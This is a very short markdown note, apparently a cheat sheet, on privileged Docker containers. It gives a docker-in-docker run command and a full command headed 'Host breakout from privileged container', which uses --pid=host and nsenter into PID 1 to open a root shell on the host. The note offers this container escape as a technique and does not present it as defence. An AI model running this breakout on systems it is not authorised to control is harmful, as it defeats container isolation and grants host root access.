# Privileged Containers

Running privileged containers:

```bash
docker run -d --rm --privileged docker:stable-dind
```

Host breakout from privileged container:

```bash
docker run --rm --privileged --pid=host -it alpine:3.8 \
    nsenter -t 1 -m -u -n -i sh
```